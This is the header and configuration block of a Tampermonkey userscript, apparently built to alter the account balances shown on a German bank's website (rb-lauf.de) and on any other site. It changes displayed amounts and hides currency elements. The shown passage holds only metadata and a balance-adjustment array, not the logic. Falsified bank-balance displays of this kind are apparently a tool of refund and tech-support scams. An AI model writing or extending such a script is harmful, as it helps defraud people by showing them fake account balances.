// ==UserScript==
// @name         Ed combined DETLEF PÄTZOLD
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.rb-lauf.de/*
// @match        https://www.drivehq.com/*
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/490455/Ed%20combined%20DETLEF%20P%C3%84TZOLD.user.js
// @updateURL https://update.greasyfork.org/scripts/490455/Ed%20combined%20DETLEF%20P%C3%84TZOLD.meta.js
// ==/UserScript==


//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================


//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------

   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
  //      { index: 0, adjustmentAmount:  60 },
  //      { index: 1, adjustmentAmount: 60 },
  //      { index: 5, adjustmentAmount: 60 },
        { index: 3, adjustmentAmount: 0 },
        { index: 6, adjustmentAmount: 0 }
        // Add more balance configurations as needed
    ];

